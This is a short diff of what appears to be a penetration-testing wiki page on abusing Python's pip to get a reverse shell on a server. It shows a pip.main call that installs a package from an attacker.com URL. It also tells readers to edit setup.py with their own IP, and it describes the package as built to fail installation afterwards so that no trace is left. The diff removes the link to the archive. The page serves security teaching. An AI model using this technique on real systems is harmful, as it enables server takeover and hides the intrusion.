@@ -105,7 +105,7 @@ pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 
 You can download the package to create the reverse shell here. Please, note that before using it you should **decompress it, change the `setup.py`, and put your IP for the reverse shell**:
 
-{% file src="../../../.gitbook/assets/reverse.tar.gz" %}
+
 
 
 This package is called `Reverse`. However, it was specially crafted so that when you exit the reverse shell the rest of the installation will fail, so you **won't leave any extra python package installed on the server** when you leave.
